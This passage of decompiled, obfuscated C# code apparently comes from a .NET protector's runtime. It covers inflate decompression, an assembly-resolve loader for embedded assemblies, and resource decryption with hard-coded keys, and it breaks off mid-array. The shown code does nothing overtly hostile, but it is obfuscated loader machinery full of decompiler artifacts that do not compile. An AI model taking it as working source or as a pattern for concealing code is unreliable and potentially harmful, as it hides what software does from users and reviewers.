                obj0.\u0001[*(int*) ((IntPtr) voidPtr + 56)] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < 512);
            }
            else
            {
              *(int*) ((IntPtr) voidPtr + 60) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 56) & 511];
              *(int*) ((IntPtr) voidPtr + 64) = 1 << (*(int*) ((IntPtr) voidPtr + 60) & 15);
              *(int*) ((IntPtr) voidPtr + 60) = -(*(int*) ((IntPtr) voidPtr + 60) >> 4);
              do
              {
                obj0.\u0001[*(int*) ((IntPtr) voidPtr + 60) | *(int*) ((IntPtr) voidPtr + 56) >> 9] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < *(int*) ((IntPtr) voidPtr + 64));
            }
            numArray2[*(int*) ((IntPtr) voidPtr + 52)] = *(int*) ((IntPtr) voidPtr + 8) + (1 << 16 - *(int*) ((IntPtr) voidPtr + 52));
          }
          *(int*) ((IntPtr) voidPtr + 48) = *(int*) ((IntPtr) voidPtr + 48) + 1;
        }
      }
    }

    static void \u0001([In] \u0004.\u0006 obj0, [In] int obj1, [In] int obj2)
    {
      obj0.\u0001 |= (uint) (obj1 << obj0.\u0003);
      obj0.\u0003 += obj2;
      if (obj0.\u0003 < 16)
        return;
      byte[] numArray = obj0.\u0001;
      \u0004.\u0006 obj = obj0;
      int num1;
      int num2 = num1 = obj.\u0002;
      obj.\u0002 = num1 + 1;
      int index = num2;
      int num3 = (int) (byte) obj0.\u0001;
      numArray[index] = (byte) num3;
      obj0.\u0001[obj0.\u0002++] = (byte) (obj0.\u0001 >> 8);
      obj0.\u0001 >>= 16;
      obj0.\u0003 -= 16;
    }

    static unsafe void \u0001([In] \u0001.\u0004.\u0001 obj0, [In] \u0001.\u0004.\u0001 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      *(int*) ((IntPtr) voidPtr + 8) = -1;
      *(int*) ((IntPtr) voidPtr + 12) = 0;
label_24:
      int num1 = *(int*) ((IntPtr) voidPtr + 12);
      int num2;
      for (int index = obj0.\u0002; num1 < index; num1 = num2)
      {
        int num3 = 1;
        *(int*) ((IntPtr) voidPtr + 16) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 12)];
label_26:
        if (*(int*) ((IntPtr) voidPtr + 16) != 0)
        {
          *(int*) voidPtr = 6;
          *(int*) ((IntPtr) voidPtr + 4) = 3;
          if (*(int*) ((IntPtr) voidPtr + 8) != *(int*) ((IntPtr) voidPtr + 16))
          {
            \u0008.\u0005.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 16));
            num3 = 0;
          }
        }
        else
          goto label_27;
label_5:
        int num4;
        int num5;
        do
        {
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 16);
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
          do
          {
            if (*(int*) ((IntPtr) voidPtr + 12) < obj0.\u0002 && *(int*) ((IntPtr) voidPtr + 8) == (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 12)])
            {
              if (true)
              {
                *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
                num4 = num3;
                num5 = 1;
                if (num5 != 0)
                {
                  num2 = num4 + num5;
                  if (true)
                    num3 = num2;
                  else
                    goto label_29;
                }
                else
                  goto label_28;
              }
              else
                goto label_26;
            }
            else
              break;
          }
          while (num2 < *(int*) voidPtr);
          int num6;
          if (num3 < *(int*) ((IntPtr) voidPtr + 4))
          {
            int num7;
            while (true)
            {
              num7 = num3--;
              if (true)
              {
                if (num7 > 0)
                  \u0008.\u0005.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 8));
                else
                  goto label_24;
              }
              else
                break;
            }
            num6 = num7;
          }
          else
            num6 = *(int*) ((IntPtr) voidPtr + 8);
          if (num6 == 0)
            goto label_20;
        }
        while (false);
        \u0008.\u0005.\u0001(obj1, \u0001.\u0004.\u0005);
        \u0008.\u0005.\u0001((\u0004.\u0006) obj0.\u0001.\u0001, num3 - 3, 2);
        goto label_24;
label_20:
        int num8 = num3;
        int num9 = 10;
label_21:
        if (num8 <= num9)
        {
          \u0008.\u0005.\u0001(obj1, \u0001.\u0004.\u0006);
          \u0008.\u0005.\u0001((\u0004.\u0006) obj0.\u0001.\u0001, num3 - 3, 3);
          goto label_24;
        }
        else
        {
          \u0008.\u0005.\u0001(obj1, \u0001.\u0004.\u0007);
          \u0008.\u0005.\u0001((\u0004.\u0006) obj0.\u0001.\u0001, num3 - 11, 7);
          goto label_24;
        }
label_28:
        num9 = num5;
        num8 = num4;
        goto label_21;
label_29:
        index = num2;
        continue;
label_27:
        *(int*) voidPtr = 138;
        *(int*) ((IntPtr) voidPtr + 4) = 3;
        goto label_5;
      }
    }

    static bool \u0001([In] \u0002.\u0003 obj0)
    {
      int num1 = obj0.\u0001;
      int num2 = 12;
      do
      {
        if (num2 != 0)
        {
          if (num1 == num2)
          {
            int num3 = \u0008.\u0005.\u0001(obj0.\u0001);
            num2 = 0;
            num1 = num3;
          }
          else
            goto label_5;
        }
      }
      while (num2 != 0);
      int num4 = num1 == num2 ? 1 : 0;
      goto label_9;
label_5:
      num4 = 0;
label_9:
      int num5;
      while (true)
      {
        bool flag = num4 != 0;
        if (false)
          ;
        num5 = flag ? 1 : 0;
        if (false)
          num4 = num5;
        else
          break;
      }
      return num5 != 0;
    }

    static void \u0001([In] \u0008.\u0002 obj0, [In] \u0008.\u0003 obj1) => obj0.\u0001.\u0001 = obj1;

    static StringDictionary \u0001([In] string obj0)
    {
      StringDictionary stringDictionary = new StringDictionary();
      \u0082 obj = \u0082.\u007E\u0097;
      string str = obj0;
      char[] chArray1 = new char[1];
      char[] chArray2;
      if (true)
        chArray2 = chArray1;
      chArray2[0] = ',';
      char[] chArray3 = chArray2;
      string[] strArray1 = obj((object) str, chArray3);
      int index1 = 0;
label_7:
      int num1 = index1;
      int num2;
      for (int index2 = strArray1.Length; num1 < index2; num1 = num2)
      {
        string[] strArray2 = \u0082.\u007E\u0097((object) \u0083.\u007E\u0098((object) strArray1[index1], new char[2]
        {
          ' ',
          ','
        }), new char[1]{ '=' });
        if (strArray2.Length < 2)
          \u0092.\u007E\u0008\u0002((object) stringDictionary, \u0006.\u0001.\u0001, strArray2[0]);
        else
          \u0092.\u007E\u0008\u0002((object) stringDictionary, \u0083.\u007E\u0098((object) strArray2[0], new char[2]
          {
            ' ',
            '='
          }), \u0083.\u007E\u0098((object) strArray2[1], new char[2]
          {
            ' ',
            '='
          }));
        num2 = index1;
        int num3 = 1;
        if (num3 != 0)
        {
          index1 = num2 + num3;
          goto label_7;
        }
        else
          index2 = num3;
      }
      return stringDictionary;
    }

    static unsafe bool \u0001([In] \u0002.\u0003 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(13);
      int num1;
      int num2;
      int num3;
      switch (obj0.\u0001)
      {
        case 0:
          *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) \u0008.\u0005.\u0001(obj0);
          goto label_42;
        case 1:
          *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) \u0008.\u0005.\u0001(obj0);
          if (false)
            goto label_28;
          else
            goto label_42;
        case 2:
          if (obj0.\u0001)
          {
            int num4 = obj0.\u0002 ? 1 : 0;
            if (false)
              return num4 != 0;
            if (num4 != 0)
            {
              obj0.\u0001 = 12;
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              goto label_42;
            }
            else
            {
              \u0008.\u0005.\u0001(obj0.\u0001);
              obj0.\u0003 = 32;
              obj0.\u0001 = 11;
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
              goto label_42;
            }
          }
          else
          {
            *(int*) voidPtr = \u0008.\u0005.\u0001(obj0.\u0001, 3);
            num2 = *(int*) voidPtr;
            num3 = 0;
            if (num3 == 0)
            {
              if (num2 < num3)
              {
                *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
                goto label_42;
              }
              else
              {
                \u0008.\u0005.\u0001(obj0.\u0001, 3);
                break;
              }
            }
            else
              goto label_14;
          }
        case 3:
          obj0.\u0006 = num1 = \u0008.\u0005.\u0001(obj0.\u0001, 16);
          goto label_21;
        case 4:
label_24:
          *(int*) ((IntPtr) voidPtr + 4) = \u0008.\u0005.\u0001(obj0.\u0001, 16);
          if (*(int*) ((IntPtr) voidPtr + 4) < 0)
          {
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
            goto label_42;
          }
          else
          {
            \u0008.\u0005.\u0001(obj0.\u0001, 16);
            if (*(int*) ((IntPtr) voidPtr + 4) == (obj0.\u0006 ^ (int) ushort.MaxValue))
            {
              obj0.\u0001 = 5;
              goto case 5;
            }
            else
              goto label_28;
          }
        case 5:
          *(int*) ((IntPtr) voidPtr + 8) = \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0001, obj0.\u0006);
          obj0.\u0006 -= *(int*) ((IntPtr) voidPtr + 8);
          if (obj0.\u0006 == 0)
          {
            obj0.\u0001 = 2;
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
            goto label_42;
          }
          else
          {
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) !\u0008.\u0005.\u0001(obj0.\u0001);
            goto label_42;
          }
        case 6:
          if (!\u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0001))
          {
            if (true)
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              goto label_42;
            }
            else
              goto label_42;
          }
          else
          {
            obj0.\u0001 = \u0008.\u0005.\u0001(obj0.\u0001);
            obj0.\u0002 = \u0008.\u0005.\u0001(obj0.\u0001);
            obj0.\u0001 = 7;
            goto case 7;
          }
        case 7:
        case 8:
        case 9:
        case 10:
          *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) \u0008.\u0005.\u0001(obj0);
          goto label_42;
        case 11:
          *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) \u0008.\u0005.\u0001(obj0);
          if (false)
            break;
          goto label_42;
        case 12:
          *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
          goto label_42;
        default:
          if (true)
            throw new FormatException();
          goto label_22;
      }
      if ((*(int*) voidPtr & 1) != 0)
        obj0.\u0001 = true;
      int num5 = *(int*) voidPtr;
      num3 = 1;
      num2 = num5;
label_14:
      num1 = num2 >> num3;
      switch (num1)
      {
        case 0:
          \u0008.\u0005.\u0001(obj0.\u0001);
          obj0.\u0001 = 3;
          break;
        case 1:
          obj0.\u0001 = \u0008.\u0004.\u0001;
          obj0.\u0002 = \u0008.\u0004.\u0002;
          obj0.\u0001 = 7;
          break;
        case 2:
          obj0.\u0001 = new \u0001.\u0005();
          obj0.\u0001 = 6;
          if (false)
            goto label_21;
          else
            break;
        default:
          throw new FormatException(\u0008.\u0005.\u0082(606) + (object) *(int*) voidPtr);
      }
      *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
      goto label_42;
label_21:
      if (num1 >= 0)
      {
        \u0008.\u0005.\u0001(obj0.\u0001, 16);
        obj0.\u0001 = 4;
        goto label_24;
      }
label_22:
      *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
      goto label_42;
label_28:
      if (true)
        throw new FormatException(\u0008.\u0005.\u0082(635));
label_42:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 12);
    }

    static unsafe bool \u0001([In] \u0004.\u0003.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      switch (obj0.\u0001)
      {
        case 2:
          if (obj0.\u0001)
          {
            obj0.\u0001 = 12;
            return false;
          }
          *(int*) voidPtr = \u0008.\u0005.\u0001(obj0.\u0001, 3);
          if (*(int*) voidPtr < 0)
            return false;
          break;
        case 3:
          if ((obj0.\u0005 = \u0008.\u0005.\u0001(obj0.\u0001, 16)) >= 0)
          {
            \u0008.\u0005.\u0001(obj0.\u0001, 16);
            goto label_18;
          }
          else
            goto label_15;
        case 4:
label_19:
          *(int*) ((IntPtr) voidPtr + 4) = \u0008.\u0005.\u0001(obj0.\u0001, 16);
          int num1 = *(int*) ((IntPtr) voidPtr + 4);
          if (false)
            return num1 != 0;
          if (num1 < 0)
          {
            if (true)
              return false;
            goto case 3;
          }
          else
            goto label_23;
        case 5:
label_24:
          *(int*) ((IntPtr) voidPtr + 8) = \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0001, obj0.\u0005);
          obj0.\u0005 -= *(int*) ((IntPtr) voidPtr + 8);
          if (obj0.\u0005 != 0)
            return !\u0008.\u0005.\u0001(obj0.\u0001);
          obj0.\u0001 = 2;
          if (true)
            return true;
          break;
        case 6:
          if (!\u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0001))
            return false;
          obj0.\u0001 = \u0008.\u0005.\u0001(obj0.\u0001);
          obj0.\u0002 = \u0008.\u0005.\u0001(obj0.\u0001);
          obj0.\u0001 = 7;
          goto case 7;
        case 7:
        case 8:
        case 9:
        case 10:
          return \u0008.\u0005.\u0001(obj0);
        case 12:
          return false;
        default:
          return false;
      }
      \u0008.\u0005.\u0001(obj0.\u0001, 3);
      if ((*(int*) voidPtr & 1) != 0)
        obj0.\u0001 = true;
      int num2 = *(int*) voidPtr;
label_6:
      switch (num2 >> 1)
      {
        case 0:
          \u0008.\u0005.\u0001(obj0.\u0001);
          obj0.\u0001 = 3;
          break;
        case 1:
          obj0.\u0001 = \u0004.\u0003.\u0004.\u0001;
          obj0.\u0002 = \u0004.\u0003.\u0004.\u0002;
          obj0.\u0001 = 7;
          if (true)
          {
            if (true)
            {
              if (false)
                goto label_23;
              else
                break;
            }
            else
              goto label_15;
          }
          else
            goto label_18;
        case 2:
          obj0.\u0001 = new \u0004.\u0003.\u0005();
          obj0.\u0001 = 6;
          break;
      }
      return true;
label_15:
      int num3 = 0;
      if (num3 == 0)
        return num3 != 0;
      num2 = num3;
      goto label_6;
label_18:
      obj0.\u0001 = 4;
      goto label_19;
label_23:
      \u0008.\u0005.\u0001(obj0.\u0001, 16);
      obj0.\u0001 = 5;
      goto label_24;
    }

    static void \u0001([In] \u0001.\u0004 obj0)
    {
label_0:
      obj0.\u000E = 0;
      obj0.\u000F = 0;
      \u0008.\u0005.\u0001(obj0.\u0001);
      do
      {
        \u0008.\u0005.\u0001(obj0.\u0002);
label_1:
        if (true)
        {
          \u0008.\u0005.\u0001(obj0.\u0003);
          if (true)
          {
            if (false)
              goto label_0;
          }
          else
            goto label_1;
        }
        else
          goto label_0;
      }
      while (false);
    }

    static unsafe void \u0001([In] \u0008.\u0004 obj0, [In] byte[] obj1)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(68);
      if (true)
        goto label_28;
label_1:
      int[] numArray1 = new int[(int) checked ((uint) unchecked (\u0008.\u0004.\u0001 + 1))];
      int[] numArray2 = new int[(int) checked ((uint) unchecked (\u0008.\u0004.\u0001 + 1))];
      void* voidPtr;
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < obj1.Length)
      {
        *(int*) ((IntPtr) voidPtr + 4) = (int) obj1[*(int*) voidPtr];
        if (*(int*) ((IntPtr) voidPtr + 4) > 0)
        {
          int[] numArray3;
          int index;
          int num2 = (numArray3 = numArray1)[(IntPtr) (index = *(int*) ((IntPtr) voidPtr + 4))] + 1;
          numArray3[index] = num2;
        }
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      *(int*) ((IntPtr) voidPtr + 12) = 512;
      *(int*) ((IntPtr) voidPtr + 16) = 1;
      while (*(int*) ((IntPtr) voidPtr + 16) <= \u0008.\u0004.\u0001)
      {
        numArray2[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 8);
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + (numArray1[*(int*) ((IntPtr) voidPtr + 16)] << 16 - *(int*) ((IntPtr) voidPtr + 16));
        if (*(int*) ((IntPtr) voidPtr + 16) >= 10)
        {
          *(int*) ((IntPtr) voidPtr + 20) = numArray2[*(int*) ((IntPtr) voidPtr + 16)] & 130944;
          *(int*) ((IntPtr) voidPtr + 24) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (*(int*) ((IntPtr) voidPtr + 24) - *(int*) ((IntPtr) voidPtr + 20) >> 16 - *(int*) ((IntPtr) voidPtr + 16));
        }
        *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
      }
      obj0.\u0001 = *(int*) ((IntPtr) voidPtr + 8) == 65536 ? new short[(int) checked ((uint) *(int*) unchecked ((IntPtr) voidPtr + 12))] : throw new Exception(\u0008.\u0005.\u0082(672));
      *(int*) ((IntPtr) voidPtr + 28) = 512;
      *(int*) ((IntPtr) voidPtr + 32) = \u0008.\u0004.\u0001;
      while (*(int*) ((IntPtr) voidPtr + 32) >= 10)
      {
        *(int*) ((IntPtr) voidPtr + 36) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (numArray1[*(int*) ((IntPtr) voidPtr + 32)] << 16 - *(int*) ((IntPtr) voidPtr + 32));
        *(int*) ((IntPtr) voidPtr + 40) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
        *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 40);
        while (*(int*) ((IntPtr) voidPtr + 44) < *(int*) ((IntPtr) voidPtr + 36))
        {
          obj0.\u0001[(int) \u0008.\u0005.\u0001(*(int*) ((IntPtr) voidPtr + 44))] = (short) (-*(int*) ((IntPtr) voidPtr + 28) << 4 | *(int*) ((IntPtr) voidPtr + 32));
          *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) + (1 << *(int*) ((IntPtr) voidPtr + 32) - 9);
          *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 44) + 128;
        }
        *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
      }
      *(int*) ((IntPtr) voidPtr + 48) = 0;
      while (*(int*) ((IntPtr) voidPtr + 48) < obj1.Length)
      {
        *(int*) ((IntPtr) voidPtr + 52) = (int) obj1[*(int*) ((IntPtr) voidPtr + 48)];
        if (*(int*) ((IntPtr) voidPtr + 52) != 0)
        {
          *(int*) ((IntPtr) voidPtr + 8) = numArray2[*(int*) ((IntPtr) voidPtr + 52)];
          *(int*) ((IntPtr) voidPtr + 56) = (int) \u0008.\u0005.\u0001(*(int*) ((IntPtr) voidPtr + 8));
          if (*(int*) ((IntPtr) voidPtr + 52) <= 9)
          {
            do
            {
              obj0.\u0001[*(int*) ((IntPtr) voidPtr + 56)] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
              *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
            }
            while (*(int*) ((IntPtr) voidPtr + 56) < 512);
          }
          else
          {
            *(int*) ((IntPtr) voidPtr + 60) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 56) & 511];
            *(int*) ((IntPtr) voidPtr + 64) = 1 << (*(int*) ((IntPtr) voidPtr + 60) & 15);
            *(int*) ((IntPtr) voidPtr + 60) = -(*(int*) ((IntPtr) voidPtr + 60) >> 4);
            do
            {
              obj0.\u0001[*(int*) ((IntPtr) voidPtr + 60) | *(int*) ((IntPtr) voidPtr + 56) >> 9] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
              *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
            }
            while (*(int*) ((IntPtr) voidPtr + 56) < *(int*) ((IntPtr) voidPtr + 64));
          }
          numArray2[*(int*) ((IntPtr) voidPtr + 52)] = *(int*) ((IntPtr) voidPtr + 8) + (1 << 16 - *(int*) ((IntPtr) voidPtr + 52));
        }
        *(int*) ((IntPtr) voidPtr + 48) = *(int*) ((IntPtr) voidPtr + 48) + 1;
      }
      return;
label_28:
      voidPtr = (void*) num1;
      goto label_1;
    }

    static Assembly \u0001([In] object obj0, [In] ResolveEventArgs obj1) => \u0006.\u0001.\u0001 ? (Assembly) null : \u0008.\u0005.\u0001(global::\u0004.\u007E\u0010((object) obj1));

    static unsafe int \u0001([In] \u0004.\u0003.\u0003 obj0, [In] \u0004.\u0003.\u0002 obj1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      int val1 = obj2;
      int val2 = 32768;
      if (val2 != 0)
        val2 -= obj0.\u0002;
      obj2 = Math.Min(Math.Min(val1, val2), \u0008.\u0005.\u0001(obj1));
      *(int*) ((IntPtr) voidPtr + 4) = 32768 - obj0.\u0001;
      if (obj2 > *(int*) ((IntPtr) voidPtr + 4))
      {
        *(int*) voidPtr = \u0008.\u0005.\u0001(obj1, obj0.\u0001, obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4));
        if (*(int*) voidPtr == *(int*) ((IntPtr) voidPtr + 4))
          *(int*) voidPtr = *(int*) voidPtr + \u0008.\u0005.\u0001(obj1, obj0.\u0001, 0, obj2 - *(int*) ((IntPtr) voidPtr + 4));
      }
      else
        *(int*) voidPtr = \u0008.\u0005.\u0001(obj1, obj0.\u0001, obj0.\u0001, obj2);
      obj0.\u0001 = obj0.\u0001 + *(int*) voidPtr & (int) short.MaxValue;
      obj0.\u0002 += *(int*) voidPtr;
      return *(int*) voidPtr;
    }

    static \u0008.\u0004 \u0001([In] \u0001.\u0005 obj0)
    {
      \u0008.\u0004 obj;
      if (true)
      {
        if (true)
          goto label_7;
label_4:
        byte[] destinationArray;
        if (true)
          Array.Copy((Array) obj0.\u0002, obj0.\u0002, (Array) destinationArray, 0, obj0.\u0003);
        obj = new \u0008.\u0004(destinationArray);
        goto label_6;
label_7:
        int num = obj0.\u0003;
        int length;
        while (true)
        {
          length = (int) checked ((uint) num);
          if (false)
            num = length;
          else
            break;
        }
        destinationArray = new byte[length];
        goto label_4;
      }
label_6:
      return obj;
    }

    static unsafe int \u0001([In] int obj0, [In] \u0001.\u0004 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      if (obj0 != (int) byte.MaxValue)
        goto label_8;
      else
        goto label_7;
label_1:
      if (true)
        goto label_6;
label_5:
      if (false)
        goto label_1;
label_6:
      return *(int*) ((IntPtr) voidPtr + 4);
label_7:
      *(int*) ((IntPtr) voidPtr + 4) = 285;
      goto label_1;
label_8:
      *(int*) voidPtr = 257;
      while (true)
      {
        do
          ;
        while (false);
        int num = obj0;
        if (true)
          goto label_4;
label_2:
        obj0 = num >> 1;
        continue;
label_4:
        if (num >= 8)
        {
          *(int*) voidPtr = *(int*) voidPtr + 4;
          if (true)
          {
            num = obj0;
            goto label_2;
          }
          else
            goto label_6;
        }
        else
          break;
      }
      *(int*) ((IntPtr) voidPtr + 4) = *(int*) voidPtr + obj0;
      goto label_5;
    }

    static unsafe byte[] \u0001([In] byte[] obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(46);
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      if (true)
        goto label_47;
label_7:
      \u0004.\u0003.\u0007 obj1;
      *(int*) ((IntPtr) voidPtr + 12) = \u0008.\u0005.\u0001(obj1);
      byte[] numArray1;
      if (true)
      {
        *(int*) ((IntPtr) voidPtr + 16) = \u0008.\u0005.\u0001(obj1);
        *(int*) ((IntPtr) voidPtr + 20) = \u0008.\u0005.\u0001(obj1);
        if (*(int*) ((IntPtr) voidPtr + 16) > 0)
        {
          byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 16)];
          obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 16));
        }
        if (*(int*) ((IntPtr) voidPtr + 20) > 0)
        {
          byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 20)];
          obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 20));
        }
        long length = obj1.Length;
        if (true)
        {
          long position = obj1.Position;
          length -= position;
        }
        byte[] buffer1 = new byte[length];
        obj1.Read(buffer1, 0, buffer1.Length);
        \u0004.\u0003.\u0001 obj2 = new \u0004.\u0003.\u0001(buffer1);
        numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 12)];
        \u0008.\u0005.\u0001(numArray1.Length, 0, numArray1, obj2);
        goto label_46;
      }
label_23:
      byte[] numArray2 = new byte[8]
      {
        (byte) 77,
        (byte) 182,
        (byte) 95,
        (byte) 69,
        (byte) 95,
        (byte) 7,
        (byte) 195,
        (byte) 34
      };
      \u0008.\u0001 obj3 = new \u0008.\u0001();
      byte[] numArray3;
      try
      {
        if (true)
        {
          using (ICryptoTransform cryptoTransform = \u0008.\u0005.\u0001(true, numArray2, obj3, numArray3))
            numArray1 = \u0008.\u0005.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
        }
      }
      finally
      {
        while (obj3 != null)
        {
          if (true)
          {
            ((IDisposable) obj3).Dispose();
            break;
          }
        }
      }
label_34:
      if (*(int*) ((IntPtr) voidPtr + 24) == 3)
      {
        byte[] numArray4 = new byte[16]
        {
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1
        };
        byte[] numArray5 = new byte[16]
        {
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2
        };
        using (\u0004.\u0002 obj4 = new \u0004.\u0002())
        {
          if (true)
          {
            using (ICryptoTransform cryptoTransform = \u0008.\u0005.\u0001(true, numArray5, numArray4, obj4))
              numArray1 = \u0008.\u0005.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
          }
        }
      }
label_46:
      obj1.Close();
      return numArray1;
label_47:
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u0008.\u0005.\u0001(callingAssembly, executingAssembly))
        return (byte[]) null;
      obj1 = new \u0004.\u0003.\u0007(obj0);
      numArray1 = new byte[0];
      *(int*) voidPtr = \u0008.\u0005.\u0001(obj1);
      if (*(int*) voidPtr == 67324752)
      {
        *(short*) ((IntPtr) voidPtr + 44) = (short) \u0008.\u0005.\u0001(obj1);
        *(int*) ((IntPtr) voidPtr + 4) = \u0008.\u0005.\u0001(obj1);
      }
      else
        goto label_15;
label_4:
      *(int*) ((IntPtr) voidPtr + 8) = \u0008.\u0005.\u0001(obj1);
      if (*(int*) voidPtr != 67324752 || *(short*) ((IntPtr) voidPtr + 44) != (short) 20 || *(int*) ((IntPtr) voidPtr + 4) != 0 || *(int*) ((IntPtr) voidPtr + 8) != 8)
        throw new FormatException("Wrong Header Signature");
      \u0008.\u0005.\u0001(obj1);
      \u0008.\u0005.\u0001(obj1);
      \u0008.\u0005.\u0001(obj1);
      goto label_7;
label_15:
      *(int*) ((IntPtr) voidPtr + 24) = *(int*) voidPtr >> 24;
      *(int*) voidPtr = *(int*) voidPtr - (*(int*) ((IntPtr) voidPtr + 24) << 24);
      if (*(int*) voidPtr != 8223355)
        throw new FormatException("Unknown Header");
      if (true)
      {
        if (*(int*) ((IntPtr) voidPtr + 24) == 1)
        {
          *(int*) ((IntPtr) voidPtr + 28) = \u0008.\u0005.\u0001(obj1);
          numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 28)];
          *(int*) ((IntPtr) voidPtr + 32) = 0;
          while (*(int*) ((IntPtr) voidPtr + 32) < *(int*) ((IntPtr) voidPtr + 28))
          {
            *(int*) ((IntPtr) voidPtr + 36) = \u0008.\u0005.\u0001(obj1);
            *(int*) ((IntPtr) voidPtr + 40) = \u0008.\u0005.\u0001(obj1);
            byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 36)];
            obj1.Read(buffer, 0, buffer.Length);
            \u0004.\u0003.\u0001 obj5 = new \u0004.\u0003.\u0001(buffer);
            \u0008.\u0005.\u0001(*(int*) ((IntPtr) voidPtr + 40), *(int*) ((IntPtr) voidPtr + 32), numArray1, obj5);
            *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) + *(int*) ((IntPtr) voidPtr + 40);
          }
        }
        if (*(int*) ((IntPtr) voidPtr + 24) == 2)
        {
          numArray3 = new byte[8]
          {
            (byte) 253,
            (byte) 50,
